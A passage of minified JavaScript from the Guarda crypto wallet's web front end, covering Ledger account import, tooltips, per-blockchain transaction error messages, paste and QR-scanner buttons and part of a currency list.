              , handleSearchAccounts = async () => {
                if (null === l || void 0 === l.ticker)
                    return;
                const e = l.ticker
                  , t = await fetchApi(e)
                  , n = undefined;
                if (w && "custom" === w.id)
                    try {
                        a(jp);
                        const e = await t.fetchAccount(g);
                        addAccount(e);
                        a(Yp)
                    } catch (e) {
                        showError()
                    }
                else {
                    P(!1);
                    try {
                        const e = await t.getAccounts();
                        N(e);
                        a(jp);
                        e.on("account", (e => {
                            if (!I) {
                                addAccount(e, isNeedToAddEmptyAccount(e));
                                a(Zp)
                            }
                        }
                        )).on("end", ( () => {
                            if (!I) {
                                a(Yp);
                                0 === c.length && hanldeAddNewWallet()
                            }
                        }
                        )).on("error", (e => {
                            P(!0);
                            "Ledger device: Internal error, please report (0x6faa)" !== e.message ? showError() : showError("Ledger connection error. Please reconnect the device and try again")
                        }
                        ));
                        return
                    } catch (e) {
                        P(!0);
                        showError()
                    }
                    a($p)
                }
            }
              , handleAddAccounts = async () => {
                r(!0);
                const e = await Promise.all(c.filter((e => isCheckedAccount(e))).map((async e => {
                    const t = e.num
                      , a = _e.ZP.getClass({
                        currency: e.currency,
                        hw: e.hw
                    });
                    e.title = `${e.currency.toUpperCase()} Ledger${t >= 1 ? ` ${t + 1}` : ""}`;
                    const n = await (new a).create(e)
                      , r = undefined;
                    if (n.data.type === we.uQ.BTC_LIKE_SEGWIT_WALLET) {
                        const e = n.subWallets[0];
                        n.data.uuid = e.data.uuid
                    }
                    x(rd.addWallet({
                        wallet: n
                    }));
                    await x(setActiveWallet(n));
                    n.fetchSubWallets && await n.fetchSubWallets();
                    return n
                }
                )));
                x(bulkAddWallets(e));
                x(triggerSaveWallets());
                a(qp);
                r(!1)
            }
              , handleStop = () => {
                C.emit("stop");
                if (c.length) {
                    a(Yp);
                    P(!0)
                } else
                    a($p)
            }
              , handleConnect = async () => {
                if (null === l || void 0 === l.ticker)
                    return;
                const e = l.ticker;
                a(zp);
                const t = await fetchApi(e);
                Jp = window.setInterval((async () => {
                    const a = undefined;
                    if (await t.getConnectionStatus(e)) {
                        clearInterval(Jp);
                        handleSearchAccounts()
                    }
                }
                ), 2e3)
            }
              , handleClosePopup = () => {
                e.onClose()
            }
              , handleCheckedAccount = e => () => {
                v[e.address] = !v[e.address];
                _({
                    ...v
                })
            }
              , isDisabledCreateButton = () => !l || n || !p && g.length > 0 || !1 === i;
            return O.createElement("div", {
                className: Op.globalWrapper
            }, t === $p && !l && O.createElement("p", null, "Connect your Ledger via USB, enter PIN on the device and select a currency below. All wallets that were created during device initialization will be added to conveniently use them in state of the art Guarda interface."), t === $p && l && O.createElement("p", null, "Use the advanced option at your discretion.", O.createElement("br", null), "Choose derivation path or type a custom one."), t === zp && O.createElement(O.Fragment, null, O.createElement("p", null, "Please make sure that Ledger is connected and unblocked. Then select ", null == l ? void 0 : l.title, " app on your device as shown and press both buttons."), O.createElement("div", {
                className: Op.wrapperLedgerImage
            }, O.createElement("img", {
                src: Xp[null == l ? void 0 : l.ticker],
                alt: "",
                style: {
                    width: "100%"
                }
            }))), (t === Zp || t === jp) && O.createElement("p", null, null == l ? void 0 : l.title, " Ledger app is connected and is synching ", null == l ? void 0 : l.title, " wallets. You can stop synching in case you are sure all the accounts desired are displayed."), t === Yp && O.createElement("p", null, "All Accounts from Ledger are found. Select the ones you want to see in Guarda interface.", O.createElement("br", null), O.createElement("br", null), "If you want to create a new account, press “Create new Account”. It will appear in Ledger and Guarda interface as well."), k && O.createElement(ui_message, {
                type: "error"
            }, k), !1 === i && O.createElement(ui_message, {
                type: "error"
            }, "Ledger supports only browsers with webusb support. Please make sure you use Chrome or Chromium"), t === $p && O.createElement("div", {
                className: "relative"
            }, O.createElement(_m, {
                currency: null == l ? void 0 : l.ticker,
                type: rm
            }), !1 !== i && O.createElement(Vd, {
                onChange: handleChangeCurrency,
                selectedCurrency: null != l ? l : void 0,
                currencies: Fp.Z.getListCurrencies(),
                className: Op.inputCurrency
            }), !l && O.createElement("div", {
                className: Op.sponsoredLink
            }, O.createElement("a", {
                target: "_blank",
                href: "https://www.ledger.com/products/ledger-nano-s?r=acff&tracker=guarda"
            }, "Don’t have your Ledger yet? Buy now", O.createElement("img", {
                src: Bp,
                alt: ""
            }))), !d && l && O.createElement("div", {
                className: Op.advancedOptions
            }, O.createElement("span", {
                className: "dashedNormal",
                onClick: () => m(!d)
            }, "Advanced Options")), d && O.createElement("div", {
                className: Op.wrapperAdvancedOptions
            }, O.createElement(Lp, {
                items: l ? Dp[null == l ? void 0 : l.ticker] : [],
                onChange: e => {
                    b(e)
                }
                ,
                selected: w,
                maxHeight: 200,
                placeholder: "Type a custom derivation path",
                emptyPlaceholder: "No available"
            }), w && "custom" === w.id && O.createElement(Ea, {
                onChange: handleChangeDerivePath,
                value: g,
                placeholder: `Derive path. Default: ${E}`
            }))), (t === Zp || t === Yp) && O.createElement("div", {
                className: Op.wrapperAccounts,
                ref: handleRefAccounts
            }, c.map((e => {
                var t;
                return O.createElement("div", {
                    className: Op.accountContainer,
                    key: `account${e.address}`
                }, O.createElement("div", {
                    className: Op.accountWrapper
                }, O.createElement(mp, {
                    onChange: handleCheckedAccount(e),
                    checked: !!v[e.address] || e.isAdded,
                    className: Op.checkbox,
                    disabled: e.isAdded,
                    isGray: e.isAdded
                }), O.createElement("div", {
                    className: Op.info
                }, O.createElement("div", {
                    className: Op.hdInfo
                }, O.createElement("div", {
                    className: Op.hdAddress
                }, "Account #", e.num), O.createElement("div", {
                    className: Op.hdIsAdded
                }, e.isAdded && "This Account was added before."))), O.createElement("div", {
                    className: Op.balance
                }, (0,
                Ko.yF)(e.balance, 8), " ", null == l || null === (t = l.ticker) || void 0 === t ? void 0 : t.toUpperCase())), O.createElement("div", {
                    className: Op.subAccountContainer
                }, e.type === we.uQ.BTC_LIKE_SEGWIT_WALLET ? e.subWallets.map((t => {
                    var a;
                    return O.createElement("div", {
                        className: Op.subAccount,
                        key: t.uuid
                    }, O.createElement("div", {
                        className: Op.info
                    }, O.createElement("span", {
                        className: Op.address
                    }, O.createElement(button_copy, {
                        text: e.address,
                        className: Op.addressText
                    }, (e => e ? "Address copied to clipboard" : formatAddress(t.address, 11)))), O.createElement("div", {
                        className: Op.derivePath
                    }, t.derivePath)), O.createElement("div", {
                        className: Op.subWalletBalance
                    }, (0,
                    Ko.yF)(t.balance, 7), " ", null == l || null === (a = l.ticker) || void 0 === a ? void 0 : a.toUpperCase()))
                }
                )) : O.createElement("div", {
                    className: Op.subAccount
                }, O.createElement("div", {
                    className: Op.info
                }, O.createElement("span", {
                    className: Op.address
                }, O.createElement(button_copy, {
                    text: e.address,
                    className: Op.addressText
                }, (t => t ? "Address copied to clipboard" : formatAddress(e.address, 11)))), O.createElement("div", {
                    className: Op.derivePath
                }, e.derivePath)))))
            }
            )), t === Yp && !n && O.createElement("div", {
                className: "dashedNormal",
                onClick: hanldeAddNewWallet
            }, "Create new Account")), (t === Zp || t === jp) && O.createElement("div", {
                className: Op.status
            }, O.createElement("div", {
                className: Op.stepInfo
            }, "Step 3 of 5"), O.createElement("div", null, O.createElement("span", null, "Synchronizing"), O.createElement(LoaderDots, {
                visible: !0
            }), " ", O.createElement("span", {
                onClick: handleStop,
                className: "dashedNormal"
            }, "Stop"))), t === zp && O.createElement("div", {
                className: Op.status
            }, O.createElement("div", {
                className: Op.stepInfo
            }, "Step 2 of 5"), O.createElement("div", null, O.createElement("span", null, "Awaiting Ledger connect"), O.createElement(LoaderDots, {
                visible: !0
            }), " ", O.createElement("span", {
                onClick: resetState,
                className: Ht()("dashedNormal", Op.stop)
            }, "Stop"))), t === Yp && O.createElement("div", {
                className: Op.footerButtonStatus
            }, n && O.createElement(LoaderDots, {
                visible: !0
            }), O.createElement("div", {
                className: Op.stepInfo
            }, "Step 4 of 5"), O.createElement("div", null, O.createElement("span", {
                onClick: resetState,
                className: Ht()("dashedNormal", Op.back)
            }, "Back"), O.createElement(Yl, {
                disabled: isDisabledAddButton(),
                onClick: handleAddAccounts,
                color: "blue",
                size: "big"
            }, "Add Accounts"))), t === qp && O.createElement("div", null, O.createElement("p", null, "Chosen addresses are added to your Guarda Wallet:"), O.createElement("div", {
                className: Op.wrapperAccounts
            }, c.filter(isCheckedAccount).map((e => {
                var t, a;
                return e.type === we.uQ.BTC_LIKE_SEGWIT_WALLET ? O.createElement("div", {
                    className: Op.accountContainer,
                    key: `account${e.address}`
                }, O.createElement("div", {
                    className: Op.accountWrapper
                }, O.createElement("div", {
                    className: Op.hdInfo
                }, O.createElement("div", {
                    className: Op.hdAddress
                }, "Account #", e.num), O.createElement("div", {
                    className: Op.hdIsAdded
                }, e.isAdded && "This Account was added before.")), O.createElement("div", {
                    className: Op.balance
                }, (0,
                Ko.yF)(e.balance, 8), " ", null == l || null === (t = l.ticker) || void 0 === t ? void 0 : t.toUpperCase())), O.createElement("div", {
                    className: Ht()(Op.subAccountContainer, Op.final)
                }, e.subWallets.map((e => {
                    var t;
                    return O.createElement("div", {
                        className: Op.subAccount,
                        key: e.uuid
                    }, O.createElement("div", {
                        className: Op.info
                    }, O.createElement("span", {
                        className: Op.address
                    }, O.createElement(button_copy, {
                        text: Op.address,
                        className: Op.addressText
                    }, (t => t ? "Address copied to clipboard" : formatAddress(e.address, 11)))), O.createElement("div", {
                        className: Op.derivePath
                    }, e.derivePath)), O.createElement("div", {
                        className: Op.subWalletBalance
                    }, (0,
                    Ko.yF)(e.balance, 7), " ", null == l || null === (t = l.ticker) || void 0 === t ? void 0 : t.toUpperCase()))
                }
                )))) : O.createElement("div", {
                    className: Op.account,
                    key: `account${e.address}`
                }, O.createElement("div", {
                    className: Op.info
                }, O.createElement("span", {
                    className: Op.address
                }, "Address: ", formatAddress(e.address, 7))), O.createElement("div", {
                    className: Op.balance
                }, (0,
                Ko.yF)(e.balance, 7), " ", null == l || null === (a = l.ticker) || void 0 === a ? void 0 : a.toUpperCase()))
            }
            ))), O.createElement("p", null, "This action won’t affect Ledger addresses you have added earlier.", O.createElement("br", null), 'Imported wallets will be marked with "Ledger" tag.'), O.createElement("div", {
                className: Op.footerButtonStatus
            }, O.createElement("div", {
                className: Op.stepInfo
            }, "Step 4 of 5"), O.createElement(Yl, {
                onClick: handleClosePopup,
                color: "blue",
                size: "big"
            }, "Go to the wallets"))), t === $p && i && O.createElement("div", {
                className: Op.footerButtonStatus
            }, n && O.createElement(LoaderDots, {
                visible: !0
            }), O.createElement("div", {
                className: Op.stepInfo
            }, "Step 1 of 5"), O.createElement(Yl, {
                disabled: isDisabledCreateButton(),
                onClick: handleConnect,
                color: "blue",
                size: "big"
            }, "Display Ledger Accounts")))
        }
          , tf = PopupImportLedger
          , af = a.p + "cd358159a23a53cadeb24901a7d61a7e.svg"
          , nf = a.p + "bfed470825db7359a7f53d4821b1e8fe.svg"
          , rf = {
            backButton: "back-button_backButton_3vfsA",
            iconBack: "back-button_iconBack_2n7KY",
            gray: "back-button_gray_3SUvf"
        };
        function BackButton(e) {
            const t = (0,
            j.k6)()
              , handleClick = () => {
                e.onClick ? e.onClick() : e.to ? t.replace(e.to) : t.goBack()
            }
            ;
            return O.createElement(Yl, {
                color: "simple",
                onClick: handleClick,
                className: Ht()(e.className, rf.backButton, e.color && rf[e.color])
            }, O.createElement("img", {
                className: rf.iconBack,
                alt: "",
                src: "gray" === e.color ? nf : af
            }), O.createElement("span", null, e.children || "Back"))
        }
        var lf = a(41514)
          , sf = a.n(lf);
        const of = {
            wrapper: "tooltip-nottify_wrapper_1sHCE",
            tooltip: "tooltip-nottify_tooltip_Dei-S",
            bottom: "tooltip-nottify_bottom_oBXfE",
            top: "tooltip-nottify_top_1vXFg",
            oneLine: "tooltip-nottify_oneLine_RWzyu",
            left: "tooltip-nottify_left_3UnOv",
            right: "tooltip-nottify_right_3HpPf",
            center: "tooltip-nottify_center_2GMcu",
            copyTooltipWrapper: "tooltip-nottify_copyTooltipWrapper_1B1Vc",
            isVisible: "tooltip-nottify_isVisible_24kx3",
            hoveredText: "tooltip-nottify_hoveredText_1fTh-",
            "type-modern": "tooltip-nottify_type-modern_kxUKA",
            copyImg: "tooltip-nottify_copyImg_1ypup",
            copyText: "tooltip-nottify_copyText_2ligC",
            copiedImg: "tooltip-nottify_copiedImg_1AXIM",
            "type-error": "tooltip-nottify_type-error_1_9O3"
        }
          , cf = a.p + "b5b6f827eec3e9d25754c2faabc7c3ab.svg"
          , uf = a.p + "e8298f184dc18ff5d03981f75c59df45.svg"
          , TooltipNotify = e => {
            const t = {};
            e.width && Object.assign(t, {
                width: e.width
            });
            e.left && Object.assign(t, {
                left: e.left
            });
            e.top && Object.assign(t, {
                top: e.top
            });
            const {text: a, positionHorizontal: n="left", positionVertical: r="top", className: l, classNameTooltip: s} = e
              , i = Ht()(of.tooltip, of[n], of[r], s, {
                [of.isVisible]: e.visible,
                [of.copyTooltipWrapper]: e.isCopyTooltip
            });
            let o;
            if (e.isCopyTooltip)
                o = O.createElement("div", {
                    style: t,
                    className: i
                }, O.createElement("img", {
                    className: Ht()(of.copyImg, {
                        [of.copiedImg]: e.isClickedCopy
                    }),
                    src: e.isClickedCopy ? uf : cf,
                    alt: "copy"
                }), O.createElement("span", {
                    className: of.copyText
                }, e.isClickedCopy ? "Copied to clipboard" : "Click to copy"));
            else {
                var c;
                o = O.createElement("div", {
                    style: t,
                    className: i,
                    dangerouslySetInnerHTML: {
                        __html: null !== (c = `<span class=${e.classNameTooltip}>${a}</span>`) && void 0 !== c ? c : ""
                    }
                })
            }
            return O.createElement("div", {
                className: Ht()(l, of.wrapper, of[`type-${e.type}`], of[`wrapper-${n}`], {
                    [of.oneLine]: !e.width
                })
            }, (e.text || e.isCopyTooltip) && o, e.isCopyTooltip ? O.createElement("div", {
                onClick: e.handleClickCopy,
                className: Ht()(e.classNameText, {
                    [of.hoveredText]: e.visible
                })
            }, e.children) : e.children)
        }
          , df = TooltipNotify;
        function tooltip_extends() {
            tooltip_extends = Object.assign ? Object.assign.bind() : function(e) {
                for (var t = 1; t < arguments.length; t++) {
                    var a = arguments[t];
                    for (var n in a)
                        Object.prototype.hasOwnProperty.call(a, n) && (e[n] = a[n])
                }
                return e
            }
            ;
            return tooltip_extends.apply(this, arguments)
        }
        const mf = undefined
          , tooltip = e => {
            const [t,a] = (0,
            O.useState)(!1)
              , [n,r] = (0,
            O.useState)(!1)
              , [l,s] = (0,
            O.useState)(void 0)
              , [i,o] = (0,
            O.useState)(void 0);
            (0,
            O.useEffect)(( () => function clearShowCopyTextTimeout() {
                window.clearTimeout(l);
                window.clearTimeout(i)
            }
            ), []);
            const showTooltip = () => {
                if (e.text || e.isCopyTooltip) {
                    a(!0);
                    window.clearTimeout(l)
                }
            }
              , hideTooltip = () => {
                s(window.setTimeout(( () => a(!1)), 50));
                o(window.setTimeout(( () => r(!1)), 100))
            }
              , handleClickCopy = () => {
                e.isCopyTooltip && r(!0)
            }
            ;
            return O.createElement("div", {
                onMouseEnter: showTooltip,
                onMouseLeave: hideTooltip,
                className: e.classNameWrapper || ""
            }, O.createElement(df, tooltip_extends({
                isClickedCopy: n,
                handleClickCopy,
                visible: t
            }, e)))
        }
          , pf = a.p + "b201f91f885851ef5a88a5005e39e54b.svg"
          , ff = a.p + "0b2683c4a951176517c3f4804d16b242.svg"
          , Ef = "secure-note_secureNote_1jkVs"
          , hf = "secure-note_white_-iv2_"
          , gf = 'Your private keys are protected with secure\n<a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard" target="_blank" rel="noopener noreferrer">AES 256</a> encryption.'
          , yf = undefined
          , secure_note = e => {
            let {color: t, className: a} = e;
            return "white" === t ? O.createElement(tooltip, {
                text: gf,
                width: "200px",
                positionVertical: "bottom"
            }, O.createElement("div", {
                className: Ht()(Ef, hf, a)
            }, O.createElement("img", {
                src: pf,
                alt: "Secure encryption"
            }), O.createElement("span", null, "Secure encryption"))) : O.createElement(tooltip, {
                text: gf,
                width: "200px",
                positionVertical: "bottom"
            }, O.createElement("div", {
                className: Ht()(Ef, a)
            }, O.createElement("img", {
                src: ff,
                alt: "Secure encryption"
            }), O.createElement("span", null, "Secure encryption")))
        }
        ;
        var vf = a(91779)
          , _f = a.n(vf);
        const wf = "transaction-send-error_error_3cYWr"
          , TransactionSendError = e => {
            const {error: t, className: a} = e
              , n = (0,
            O.useMemo)(( () => {
                var e;
                if (!t)
                    return null;
                if ("string" == typeof t)
                    return t.includes("bad-txns-premature-spend-of-coinbase, tried to spend coinbase at depth") ? "Qtum blockchain freezes your balance for about 18 hours after a staking transaction. You can send QTUM as soon as the staking transaction gets 2,000 confirmations." : t;
                if (null != t && t.code) {
                    let a;
                    switch (t.code) {
                    case _f().HBAR_SDK_ERROR:
                        {
                            const e = null == t ? void 0 : t.cause
                              , n = e && (null == e ? void 0 : e.status) && e.status.toString();
                            switch (n) {
                            case "TOKEN_NOT_ASSOCIATED_TO_ACCOUNT":
                                a = O.createElement("span", null, "Recipient cannot receive this token. Due to Hedera's rules, to receive a token, they need to add the token first.");
                                break;
                            case "TOKEN_ALREADY_ASSOCIATED_TO_ACCOUNT":
                                a = O.createElement("span", null, "Token is already added.");
                                break;
                            case "TRANSACTION_REQUIRES_ZERO_TOKEN_BALANCES":
                            case "TRANSFERS_NOT_ZERO_SUM_FOR_TOKEN":
                                a = O.createElement("span", null, "Invalid token data. This token cannot be sent.");
                                break;
                            case "ACCOUNT_FROZEN_FOR_TOKEN":
                                a = O.createElement("span", null, "The sender or recipient account must be unfrozen for operations with this token.");
                                break;
                            case "ACCOUNT_DELETED":
                                a = O.createElement("span", null, "The recipient’s account has been deleted.");
                                break;
                            case "ACCOUNT_EXPIRED_AND_PENDING_REMOVAL":
                                a = O.createElement("span", null, "The sender or recipient account has expired. Renewal required.");
                                break;
                            case "PAYER_ACCOUNT_DELETED":
                                a = O.createElement("span", null, "Your HBAR account has been marked as deleted on the network.");
                                break;
                            case "ACCOUNT_REPEATED_IN_ACCOUNT_AMOUNTS":
                                a = O.createElement("span", null, "According to Hedera rules, you can’t send transactions to your own address.");
                                break;
                            case "TOKENS_PER_ACCOUNT_LIMIT_EXCEEDED":
                                a = O.createElement("span", null, "The limit of tokens per account has been reached.");
                                break;
                            case "ACCOUNT_KYC_NOT_GRANTED_FOR_TOKEN":
                                a = O.createElement("span", null, "Sending token with KYC key is not supported in Guarda.");
                                break;
                            default:
                                a = n && O.createElement("span", null, `${n.charAt(0)}${n.slice(1).replace(/_/g, " ").toLowerCase()}`)
                            }
                            break
                        }
                    case _f().DUST:
                        a = O.createElement("span", null, "Transaction failed. The network will not accept this transaction as it doesn’t allow", " ", O.createElement("a", {
                            href: "https://support.guarda.com/troubleshooting/dust-error-what-is-it",
                            rel: "noopener noreferrer",
                            target: "_blank"
                        }, "dust"), " ", "to be left on the balance. You can either use Send All or make the transaction amount smaller to eliminate the dust.");
                        break;
                    case _f().ADA_SMALL_OUTPUT:
                        a = O.createElement("span", null, "One of the outputs in the transaction has an amount less than the minimum required value (1 ADA). Try changing the send amount.");
                        break;
                    case _f().LEDGER_TRANSPORT_TIMEOUT:
                        a = O.createElement("span", null, "The action hasn't been confirmed on Ledger within 30 seconds. Please try again.");
                        break;
                    case _f().TIMESTAMP_INVALID:
                        a = O.createElement("span", null, "Transaction failed. The blockchain did not accept the timestamp of transaction as valid. Please synchronize time on your device with Internet and try again.");
                        break;
                    case _f().MEMPOOL_CONFLICT:
                        a = O.createElement("span", null, "Transaction failed. Mempool conflict. Please wait till your previous transaction(s) get confirmed or try again later.");
                        break;
                    case _f().LESS_THAN_RELAY:
                        a = O.createElement("span", null, "Insufficient fee – transaction was rejected by the Network. Please set a higher fee in the Advanced options (Step 1) and try again.");
                        break;
                    case _f().XLM_OP_LOW_REVERSE:
                        a = O.createElement("span", null, "You are sending funds to an inactive address. Due to the Network rules, you must transfer at least 1.0001 XLM to activate it.");
                        break;
                    case _f().NOT_ENOUGH_CPU:
                        a = O.createElement("span", null, "Transaction failed. Not enough staked CPU.");
                        break;
                    case _f().NOT_ENOUGH_NET:
                    case _f().NOT_INSUFFICIENT_NET:
                        a = O.createElement("span", null, "Transaction failed. Not enough staked NET.");
                        break;
                    case _f().LEDGER_COMMON_ERROR:
                        a = O.createElement("span", null, "Ledger Nano isn’t connected properly. Please try disconnecting the device and plug it in again.");
                        break;
                    case _f().DST_TAG_NEEDED:
                        a = O.createElement("span", null, "Network requires a destination tag. Set it in the Advanced options (Step 1).");
                        break;
                    case _f().DISABLED_MASTER_KEY:
                        a = O.createElement("span", null, "Transaction failed. Your XRP account master key is disabled, you can't send transactions from this address.");
                        break;
                    case _f().NO_VALID_UTXO:
                        a = O.createElement("span", null, "Not enough balance including pending transactions. Kindly wait until the previous transaction is confirmed.");
                        break;
                    case _f().INSUFFICIENT_FUNDS:
                        a = O.createElement("span", null, "Insufficient funds on your wallet balance.");
                        break;
                    case _f().INSUFFICIENT_PRIORITY:
                    case _f().RATE_LIMITED:
                        a = O.createElement("span", null, "Insufficient fee – transaction rejected by the Network. Please set a higher fee in the Advanced options (Step 1) and try again.");
                        break;
                    case _f().RAW_TX_TOO_BIG:
                        a = O.createElement("span", null, "Transaction failed. The transaction you are trying to send uses too many inputs and does not fit in the blockchain limits. Please send the desired amount in multiple transactions.");
                        break;
                    case _f().MONERO_SPENDABLE_BALANCE_LOW:
                        a = O.createElement("span", null, "Transaction cannot be processed until previous transaction(s) get at least 10 confirmations.");
                        break;
                    case _f().XRP_NO_DST_INSUF_XRP:
                        a = O.createElement("span", null, "You are sending funds to an inactive address. Due to the Network rules, you must transfer at least 10 XRP to activate it.");
                        break;
                    case _f().BNB_TAG_REQUIERED:
                        a = O.createElement("span", null, "Receiver requires non-empty memo in transaction. Set it in the Advanced options (Step 1).");
                        break;
                    case _f().MONERO_INVALID_PAYMENT_ID:
                        a = O.createElement("span", null, "Payment ID has invalid length. Reduce it to 16 or 64 characters hex string in the Advanced options (Step 1).");
                        break;
                    case _f().XRP_QUEQUED:
                        a = O.createElement("span", null, "Transaction failed. Network is overloaded. Please try again later.");
                        break;
                    case _f().HBAR_ACCOUNT_NOT_FOUND:
                        a = O.createElement("span", null, "Failed to import wallet. Address related to the private key is not registered.");
                        break;
                    case _f().HBAR_ACCOUNT_EXPIRED:
                        a = O.createElement("span", null, "Failed to import wallet. Account related to this private key is expired.");
                        break;
                    case _f().TRON_SEND_TO_YOUSELF:
                        a = O.createElement("span", null, 'Addresses "From" and "To" are the same, which is not allowed by the Network rules. Change the "To" address.');
                        break;
                    case _f().INTRINSIC_GAS_TOO_LOW:
                        a = O.createElement("span", null, "Transaction failed. Gas limit is too low. Increase it in the Advanced options (Step 1).");
                        break;
                    case _f().INSUFFICIENT_FUNDS_FOR_GAS:
                        a = O.createElement("span", null, "Insufficient funds to send the amount and pay the Network fee. Please reduce the amount.");
                        break;
                    case _f().EXCEEDS_BLOCK_GAS_LIMIT:
                        a = O.createElement("span", null, "Transaction failed. Gas limit is too high. Reduce it in the Advanced options (Step 1).");
                        break;
                    case _f().REPLACEMENT_TRANSACTION_UNDERPRICED:
                        a = O.createElement("span", null, "You have a pending transaction with the same nonce and gas price. To make a new transaction enter a different nonce or increase gas price in the Advanced options (Step 1).");
                        break;
                    case _f().MONERO_TX_NOT_CONFIRMED:
                        a = O.createElement("span", null, "Transaction failed. Mempool conflict. Please wait till your previous transaction(s) get confirmed.");
                        break;
                    case _f().NONCE_TOO_LOW:
                        a = O.createElement("span", null, "Transaction failed. Nonce is too low. Change it or leave empty for auto-set in the Advanced options (Step 1).");
                        break;
                    case "FIO_ERROR":
                        a = O.createElement("span", null, t.message);
                        break;
                    case _f().SELF_TX_DISABLED:
                        a = O.createElement("span", null, 'Addresses "From" and "To" are the same, which is not allowed by the Network rules. Change the "To" address.');
                        break;
                    case _f().KSM_LOW_EXISTENTIAL_DEPOSIT:
                        a = O.createElement("span", null, "Amount too low to create account due to existential deposit.");
                        break;
                    case _f().EGLD_GAS_PRICE_TOO_LOW:
                    case _f().EGLD_GAS_LIMIT_TOO_LOW:
                        a = O.createElement("span", null, (null === (e = t.cause) || void 0 === e ? void 0 : e.message) || "Transaction failed");
                        break;
                    default:
                        a = O.createElement("span", null, (null == t ? void 0 : t.message) || "Transaction failed")
                    }
                    return a
                }
            }
            ), [t]);
            return t ? O.createElement(ui_message, {
                type: "error",
                className: Ht()(wf, a)
            }, n || O.createElement("span", null, "Transaction failed")) : null
        }
          , bf = TransactionSendError
          , kf = navigator.userAgent
          , isFirefox = () => kf.includes("Firefox")
          , Sf = "paste-button_pasteButton_3WjgS"
          , Cf = undefined
          , paste_button = e => {
            let {className: t, pasteSetState: a} = e;
            const pasteHandle = () => {
                navigator.clipboard.readText().then((e => a(e)))
            }
            ;
            return O.createElement(Yl, {
                color: "simple",
                size: "small",
                className: Ht()(t && t, Sf),
                onClick: pasteHandle
            }, "Paste")
        }
          , Nf = a.p + "c61d6d760630ffa83fc641105101d67c.svg"
          , Tf = "qr-scanner_wrapper_1Etxn"
          , Af = "qr-scanner_previewObject_1roth"
          , xf = "qr-scanner_isError_3jRl-"
          , If = "qr-scanner_isDisabledIcon_2xtXL"
          , QrScanner = e => {
            const [t,n] = (0,
            O.useState)(null)
              , [r,l] = (0,
            O.useState)(!1)
              , [s,i] = (0,
            O.useState)(!1)
              , handleEsc = e => {
                let {keyCode: t} = e;
                27 === t && l(!1)
            }
            ;
            (0,
            O.useEffect)(( () => {
                window.addEventListener("keydown", handleEsc, !1);
                a.e(4736).then(a.t.bind(a, 57164, 23)).then((e => {
                    n(e)
                }
                ));
                return () => {
                    window.removeEventListener("keydown", handleEsc)
                }
            }
            ), []);
            const handleError = () => i(!0)
              , handleClose = () => l(!1)
              , handleScan = function() {
                let t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "";
                if (e.onScan && t) {
                    e.onScan(t || "");
                    l(!1)
                }
            }
              , handleClick = () => {
                e.disabled || l(!r)
            }
            ;
            return t ? s && r ? O.createElement("div", {
                className: Tf
            }, O.createElement(Xl(), {
                onClose: handleClose,
                visible: r
            }, O.createElement("div", {
                className: Af
            }, O.createElement("div", {
                className: xf
            }, "Camera is not supported"))), O.createElement("div", {
                onClick: handleClick
            }, O.createElement("img", {
                src: Nf,
                alt: "",
                className: Ht()({
                    [If]: e.disabled
                })
            }))) : O.createElement(tooltip, {
                className: Tf,
                text: e.disabled ? "" : "Scan QR code",
                positionHorizontal: "right"
            }, O.createElement(Xl(), {
                onClose: handleClose,
                visible: r
            }, O.createElement("div", {
                className: Af
            }, s && O.createElement("div", {
                className: xf
            }, "Camera is not supported"), O.createElement(t.default, {
                delay: 500,
                onError: handleError,
                onScan: handleScan,
                style: {
                    width: "100%"
                }
            }))), O.createElement("div", {
                onClick: handleClick
            }, O.createElement("img", {
                src: Nf,
                alt: "",
                className: Ht()({
                    [If]: e.disabled
                })
            }))) : null
        }
        ;
        QrScanner.propTypes = {
            onScan: as().func,
            disabled: as().bool
        };
        const Pf = QrScanner
          , Lf = "qr-scanner-paste-button_wrapperQrScanner_24uj7"
          , Ff = undefined
          , qr_scanner_paste_button = e => {
            let {setAddress: t, className: a} = e;
            return O.createElement("div", {
                className: Ht()(Lf, a)
            }, !isFirefox() && O.createElement(paste_button, {
                pasteSetState: t
            }), O.createElement(Pf, {
                onScan: t
            }))
        }
        ;
        var Wf = a(41106)
          , Rf = a(68214)
          , Bf = a.n(Rf);
        const generateBackupIdFromMnemonic = async e => {
            const {privateKey: t} = await Wf.deriveForAdapter(e, {
                ticker: "eth",
                accountIndex: 666,
                chainIndex: 666,
                addressIndex: 666
            })
              , a = await Se.Z.getApiByCurrency("eth")
              , {address: n} = await a.getAddressFromPrivateKey({
                privateKey: t
            });
            return n
        }
          , generateWalletUUID = e => {
            let {mnemonic: t, address: a, currency: n, family: r} = e;
            return Bf()((t || "") + a + n + (r || "")).toString()
        }
        ;
        var Of = a(16700)
          , Df = a(34857);
        const Mf = [{
            id: "btc",
            ticker: "btc",
            family: "",
            contract: "",
            title: "Bitcoin",
            rank: 1
        }, {
            id: "eth",
            ticker: "eth",
            family: "",
            contract: "",
            title: "Ethereum",
            rank: 2
        }, {
            id: "usdt:eth:0xdac17f958d2ee523a2206206994597c13d831ec7",
            ticker: "usdt",
            family: "eth",
            contract: "0xdac17f958d2ee523a2206206994597c13d831ec7",
            title: "Tether",
            decimals: 6,
            rank: 3
        }, {
            id: "trx",
            ticker: "trx",
            family: "",
            contract: "",
            title: "TRON",
            rank: 4
        }, {
            id: "usdt:trx:TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
            ticker: "usdt",
            family: "trx",
            contract: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
            title: "Tether",
            decimals: 6,
            rank: 5
        }, {
            id: "usdc:eth:0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
            ticker: "usdc",
            family: "eth",
            contract: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
            title: "USD Coin",
            decimals: 6,
            rank: 6
        }, {
            id: "bnb",
            ticker: "bsc",
            family: "",
            contract: "",
            title: "BNB",
            rank: 7
        }, {
            id: "busd:bnb:busd-bd1",
            ticker: "busd",
            family: "bnb",
            contract: "busd-bd1",
            title: "Binance USD",
            rank: 8
        }, {
            id: "xmr",
            ticker: "xmr",
            family: "",
            contract: "",
            title: "Monero",
            rank: 9
        }, {
            id: "xrp",
            ticker: "xrp",
            family: "",
            contract: "",
            title: "XRP",
            rank: 10
        }, {
            id: "doge",
            ticker: "doge",
            family: "",
            contract: "",
            title: "Dogecoin",
            rank: 11
        }, {
            id: "ada-shelley",
            ticker: "ada-shelley",
            family: "",
            contract: "",
            title: "Cardano",
            rank: 12
        }, {
